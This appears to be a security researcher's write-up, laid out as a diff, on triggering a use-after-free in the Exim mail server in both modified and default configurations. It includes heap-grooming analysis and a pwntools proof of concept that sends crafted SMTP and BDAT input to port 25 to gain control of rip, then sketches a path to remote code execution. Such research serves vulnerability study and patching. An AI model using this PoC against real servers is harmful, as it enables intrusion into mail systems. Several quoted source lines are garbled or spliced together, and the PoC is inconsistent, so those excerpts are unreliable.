@@ -1,0 +1,131 @@
+**Author: Hcamael@Knownsec 404 Team**  
+**Chinese Version:**
+After I posted my last paper _[Exim UAF Vulnerability
+Analysis](https://paper.seebug.org/1028/ "Exim UAF Vulnerability Analysis")_ ,
+I got some inspiration from @orange and got to know that meh's PoC needs
+special configuration to trigger. Then I did research on how to trigger the
+vulnerability after modifying the configuration and how to trigger the
+vulnerability in a default situation.
+#### Recurrence
+Comment out `control = dkim_disable_verify` in the `/usr/exim/configure` file.
+Adjust the padding of the lower poc, then you can trigger the UAF
+vulnerability and control rip
+##### Trigger Under Special Configuration
+There is a variable `dkim_disable_verify`, which will become `true` after
+setting. If it is commented out, it will be the default value of `false`.
+Let's look at the code in `receive.c`:
+    BOOL
+    Receive_msg(BOOL extract_recip)
+    {
+    ......
+    1733: if (smtp_input && !smtp_batched_input && !dkim_disable_verify)
+    1734: dkim_exim_verify_init(chunking_state  pdkim_init_verify -> ctx->linebuf = store_get(PDKIM_MAX_BODY_LINE_LEN);
+    Bdat_getc -> smtp_getc -> smtp_refill -> dkim_exim_verify_feed -> pdkim_feed -> string_catn -> string_get -> store_get(0x64)
+    #define PDKIM_MAX_BODY_LINE_LEN 16384 //0x4000
+As I've mentioned in the previous article, the reason why the UAF
+vulnerability could not be successfully triggered is that the freed heap is at
+the top of the heap and is merged with the top chunk after being released.
+After commenting out the configuration of dkim, function `store_get` is
+executed in the flow of the `dkim_exim_verify_init` function, and heap of
+0x4000 size is applied. The `dkim_exim_verify_init` function and the
+`dkim_exim_verify_feed` function both have the same code as below:
+    Store_pool = POOL_PERM;
+    ......
+    Store_pool = dkim_verify_oldpool;
+    ---------------    Enum { POOL_MAIN, POOL_PERM, POOL_SEARCH };
+The global variable `store_pool` has been modified to 1. As exim implements a
+set of heap management, so when `store_pool` is different, it means the heap
+is isolated and will not affect the use of heap management global variables
+such as `current_block` in the `receive_msg` function.
+When the dkim-related code is executed, the `store_pool` is restored.
+A heap of 0x4000 size is applied. Since it is greater than 0x2000, the value
+of `yield_length` becomes 0 after the application, which causes the
+`store_get(0x64)` to apply for a heap again, so at last there are two heaps
+stacked on heap1. After heap1 is released, it is put into unsortbin, and this
+will trigger the UAF vulnerability and caused a crash.
+##### Recurrence in Default Configuration
+Under the guidance of @explorer, I find a way to trigger the vulnerability in
+a default situation.
+In fact, the key is to find a way to malloc a heap on heap1. I will start the
+analysis from the beginning.
+    // daemon.c
+    137 static void
+    138 handle_smtp_call(int *listen_sockets, int listen_socket_count,
+    139 int accept_socket, struct sockaddr *accepted)
+    140 {
+    ......
+    348 pid = fork();
+    352 if (pid == 0)
+    353 {
+    ......
+    504 if ((rc = smtp_setup_msg()) > 0)
+    505 {
+    506 BOOL ok = receive_msg(FALSE);
+    ......
+First, when a new connection comes in, fork a child process, and then we will
+enter the branch in the code above. `smtp_setup_msg` function is used to
+receive the commands. We first send a bunch of invalid commands (padding),
+control the value of `yield_length` to be less than 0x100. Because the command
+is invalid, the process enters `smtp_setup_msg` again.
+At this time we send a command `BDAT 16356`
+There are some important operations:
+    5085 if (sscanf(CS smtp_cmd_data, "%u %n", &chunking_datasize, &n)  0)
+    547 return lwr_receive_getc(chunking_data_left--);
+`lwr_receive_getc=smtp_getc` gets 16356 strings from this function
+First, we send 16352 a as the padding, and then the following process is
+excuted:
+  * store_extend return 0 -> store_get -> store_release
+It first applied for a 0x4010 heap2, and then released the heap1 with a length
+of 0x2010
+Then send `:\r\n` to the following code branch:
+    1902 if (ch == '\r')
+    1903 {
+    1904 ch = (receive_getc)(GETC_BUFFER_UNLIMITED);
+    1905 if (ch == '\n')
+    1906 {
+    1907 if (first_line_ended_crlf == TRUE_UNSET) first_line_ended_crlf = TRUE;
+    1908 goto EOL;
+    1909 }
+Jumped to EOL. The most important is the last few lines of code:
+    2215 header_size = 256;
+    2216 next = store_get(sizeof(header_line));
+    2217 next->text = store_get(header_size);
+    2218 ptr = 0;
+    2219 had_zero = 0;
+    2220 prevlines_length = 0;
+    2221 } /* Continue, starting to read the next header */
+Some variables are re-initialized. Since the padding has executed
+`store_get(0x4000)`, so `yield_length=0`. At this time, calling store_get
+again will apply for a 0x2000 heap. Right in unsortbin, it is found that the
+size of heap1 is just right. So this time we will get heap1. At the top of
+heap1, there is a unreleased 0x4010 heap which has been used by `next->text`.
+The PoC is as follows:
+    r = remote('localhost', 25)
+    R.recvline()
+    R.sendline("EHLO test")
+    R.recvuntil("250 HELP")
+    R.sendline("MAIL FROM:")
+    R.recvline()
+    R.sendline("RCPT TO:")
+    R.recvline()
+    # raw_input()
+    R.sendline('a'*0x1300+'\x7f')
+    # raw_input()
+    R.recvuntil('command')
+    R.sendline('BDAT 16356')
+    R.sendline("a"*16352+':\r')
+    R.sendline('aBDAT \x7f')
+    s = 'a'*6 + p64(0xabcdef)*(0x1e00/8)
+    R.send(s+ ':\r\n')
+    R.recvuntil('command')
+    #raw_input()
+    R.send('\n')
+##### Exploit
+According to the article published by CVE , it is learned that fflush of file
+IO is used to control the first parameter, then the vtable is forged by heap
+blasting and memory enumeration, and it will finally jumps to the
+`expand_string` function to execute the command. I studied the related use of
+`_IO_FILE` in ctf and then implement RCE. The result is as follows:
+#### Reference link
+  1. 
+* * *
